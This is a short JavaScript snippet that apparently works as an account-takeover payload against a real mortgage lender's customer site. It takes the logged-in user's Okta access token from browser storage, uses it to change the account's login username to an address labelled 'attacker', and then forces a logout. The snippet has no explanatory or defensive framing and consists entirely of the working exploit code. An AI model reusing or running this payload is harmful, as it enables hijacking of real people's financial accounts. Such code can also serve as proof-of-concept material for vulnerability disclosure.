const apiUrl = 'https://my.veteransunited.com/api/v2/profiles/credentials';
const token = JSON.parse(localStorage.getItem('okta-token-storage')).accessToken.accessToken;

const requestData = {
  username: 'dmxjon1+attacker@gmail.com'
};

fetch(apiUrl, {
  method: 'PATCH',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${token}`,
    'Sec-Ch-Ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'Dnt': '1',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Ngsw-Bypass': '',
    'Accept': 'application/json, text/plain, */*',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Origin': 'https://my.veteransunited.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://my.veteransunited.com/profile',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
  },
  body: JSON.stringify(requestData)
})
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }
    return response.json();
  })
  .then(data => {
    console.log('PATCH request successful:', data);
    
    // Redirect user to logout
    window.location.href = 'https://my.veteransunited.com/logout';
  })
  .catch(error => {
    console.error('Error:', error);
  });
